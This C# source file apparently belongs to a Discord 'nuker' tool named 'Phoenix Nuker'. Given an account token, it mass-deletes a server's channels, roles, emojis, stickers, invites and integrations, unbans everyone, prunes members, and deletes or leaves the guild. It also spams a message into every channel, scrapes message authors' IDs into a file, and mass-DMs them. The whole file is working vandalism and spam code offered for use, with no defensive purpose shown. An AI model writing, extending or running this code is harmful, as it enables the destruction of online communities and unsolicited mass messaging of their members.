﻿using Leaf.xNet;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading;

namespace nuker
{
    public class Server
    {
        public static string apiv = Config.APIVersion;
        public static int WaitTimeShort = Config.WaitTimeShort;
        public static int WaitTimeLong = Config.WaitTimeLong;

        public static void MsgInEveryChannel(string token, string guildid, string message)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/channels");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        if (entry.type == "0")
                        {
                            HttpClient client = new HttpClient();
                            client.DefaultRequestHeaders.Add("Authorization", token);
                            client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/channels/{entry.id}/messages");
                            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                            HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/channels/{entry.id}/messages");
                            request2.Content = new System.Net.Http.StringContent("{\"content\":\"" + message + "\"}", Encoding.UTF8, "application/json");
                            client.SendAsync(request2);
                            Thread.Sleep(WaitTimeShort);
                        }
                    }
                }
            }
            catch { }
        }

        public static void LeaveDeleteGuild(string token, string guildid, string owner)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    if (owner == "y")
                    {
                        req.AddHeader("Authorization", token);
                        req.Delete($"https://discord.com/api/v{apiv}/guilds/{guildid}");
                        Thread.Sleep(WaitTimeShort);
                    }
                    else if (owner == "n")
                    {
                        req.AddHeader("Authorization", token);
                        req.Delete($"https://discord.com/api/v{apiv}/users/@me/guilds/{guildid}");
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void ServerInformation(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse serverinfo = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}");
                    var id = JObject.Parse(serverinfo.ToString())["id"];
                    var ownerid = JObject.Parse(serverinfo.ToString())["owner_id"].ToString();
                    var region = JObject.Parse(serverinfo.ToString())["region"].ToString();
                    var iconid = JObject.Parse(serverinfo.ToString())["icon"].ToString();
                    string avatar = $"https://cdn.discordapp.com/icons/{id}/{iconid}.webp";
                    var vanityurl = JObject.Parse(serverinfo.ToString())["vanity_url_code"].ToString();
                    req.Close();

                    Console.WriteLine("Server Information:\n");
                    Console.WriteLine($"ID: {id}\nOwner ID: {ownerid}\nRegion: {region}\nVanity Code: {vanityurl}\nAvatar: {avatar}");
                    Console.WriteLine("\nPress any key to go back.");
                    Console.ReadKey();
                    Console.Clear();
                }
            }
            catch { }
        }

        public static void CreateChannel(string token, string guildid, string name)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
                    client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/channels");
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/guilds/{guildid}/channels");
                    request.Content = new System.Net.Http.StringContent("{\"name\":\"" + name + "\"}", Encoding.UTF8, "application/json");
                    client.SendAsync(request);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { }
        }

        public static void CreateRole(string token, string guildid, string name)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    client.DefaultRequestHeaders.Add("X-Audit-Log-Reason", "Phoenix Nuker");
                    client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/roles");
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/guilds/{guildid}/roles");
                    request.Content = new System.Net.Http.StringContent("{\"name\":\"" + name + "\"}", Encoding.UTF8, "application/json");
                    client.SendAsync(request);
                    Thread.Sleep(WaitTimeShort);
                }
            }
            catch { }
        }

        public static void DeleteInvites(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/invites");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/invites/{entry.code}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/invites/{entry.code}");
                        client.SendAsync(request2);
                        Console.WriteLine($"Deleted: {entry.code}");
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteEmojis(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/emojis");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/emojis/{entry.id}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{guildid}/emojis/{entry.id}");
                        client.SendAsync(request2);
                        Console.WriteLine($"Deleted: {entry.name}");
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteChannels(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/channels");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/channels/{entry.id}");
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/channels/{entry.id}");
                        client.SendAsync(request2);
                        Console.WriteLine($"Deleted: {entry.name}");
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void RemoveBans(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/bans");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/bans/" + entry.user["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{guildid}/bans/" + entry.user["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Removed: " + entry.user["username"] + "#" + entry.user["discriminator"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteRoles(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/roles");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/roles/" + entry["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{guildid}/roles/" + entry["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteStickers(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/stickers");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/stickers/" + entry["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{guildid}/stickers/" + entry["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static string GetServerName(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse servername = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}");
                    var name = JObject.Parse(servername.ToString())["name"];
                    req.Close();
                    return name.ToString();
                }
            }
            catch { return "N/A"; }
        }

        public static void PruneMembers(string token, string guildid)
        {
            try
            {
                HttpClient client = new HttpClient();
                client.DefaultRequestHeaders.Add("Authorization", token);
                client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/prune");
                client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{apiv}/guilds/{guildid}/prune");
                request.Content = new System.Net.Http.StringContent("{\"days\": 1}", Encoding.UTF8, "application/json");
                client.SendAsync(request);
            }
            catch { }
        }

        public static void RemoveIntegrations(string token, string guildid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{apiv}/guilds/{guildid}/integrations");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        HttpClient client = new HttpClient();
                        client.DefaultRequestHeaders.Add("Authorization", token);
                        client.BaseAddress = new Uri($"https://discord.com/api/v{apiv}/guilds/{guildid}/integrations/" + entry["id"]);
                        HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Delete, $"https://discord.com/api/v{apiv}/guilds/{guildid}/integrations/" + entry["id"]);
                        client.SendAsync(request2);
                        Console.WriteLine("Deleted: " + entry["name"]);
                        Thread.Sleep(WaitTimeShort);
                    }
                }
            }
            catch { }
        }

        public static void DeleteAllReactions(string token, ulong cid, ulong mid)
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    req.Delete($"https://discord.com/api/v{apiv}/channels/{cid}/messages/{mid}/reactions");
                }
            }
            catch { }
        }

        public static void GetIDs(string token, string guildid)
        {
            try
            {
                if (!File.Exists("ids.txt"))
                {
                    File.Create("ids.txt").Dispose();
                }

                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse request = req.Get($"https://discord.com/api/v{Config.APIVersion}/guilds/{guildid}/channels");
                    var array = JArray.Parse(request.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        req.AddHeader("Authorization", token);
                        HttpResponse request2 = req.Get($"https://discord.com/api/v{Config.APIVersion}/channels/{entry.id}/messages?limit=100");
                        var array2 = JArray.Parse(request2.ToString());
                        Console.WriteLine(array2);
                        Console.ReadKey();
                        req.Close();

                        foreach (dynamic entry2 in array2)
                        {
                            string id = entry2.author["id"];

                            if (!File.ReadAllLines("ids.txt").Contains(id))
                            {
                                File.AppendAllText("ids.txt", id + Environment.NewLine);
                            }
                        }
                    }
                }
            }
            catch { }
        }

        public static void ServerDM(string token, string message)
        {
            try
            {
                if (!File.Exists("dmed.txt"))
                {
                    File.Create("dmed.txt").Dispose();
                }
                string[] list = File.ReadAllLines("dmed.txt");
                foreach (var id in File.ReadAllLines("ids.txt"))
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    client.BaseAddress = new Uri($"https://discord.com/api/v{Config.APIVersion}/users/@me/channels");
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    HttpRequestMessage request = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{Config.APIVersion}/users/@me/channels");
                    request.Content = new System.Net.Http.StringContent($"{{\"recipient_id\":\"{id}\"}}", Encoding.UTF8, "application/json");
                    client.SendAsync(request).Wait();
                }
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("Authorization", token);
                    HttpResponse r3quest = req.Get($"https://discord.com/api/v{Config.APIVersion}/users/@me/channels");
                    var array = JArray.Parse(r3quest.ToString());
                    req.Close();
                    foreach (dynamic entry in array)
                    {
                        string id = entry.id;
                        if (!File.ReadAllLines("dmed.txt").Contains(id))
                        {
                            HttpClient client2 = new HttpClient();
                            client2.DefaultRequestHeaders.Add("Authorization", token);
                            client2.BaseAddress = new Uri($"https://discord.com/api/v{Config.APIVersion}/channels/{entry.id}/messages");
                            client2.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                            HttpRequestMessage request2 = new HttpRequestMessage(System.Net.Http.HttpMethod.Post, $"https://discord.com/api/v{Config.APIVersion}/channels/{entry.id}/messages");
                            request2.Content = new System.Net.Http.StringContent($"{{\"content\":\"{message}\"}}", Encoding.UTF8, "application/json");
                            client2.SendAsync(request2);
                            Console.WriteLine($"Messaged: {entry.recipients[0].username}#{entry.recipients[0].discriminator}");
                            Thread.Sleep(200);
                            File.AppendAllText("dmed.txt", id + Environment.NewLine);
                        }
                    }
                }
            }
            catch { }
        }
    }
}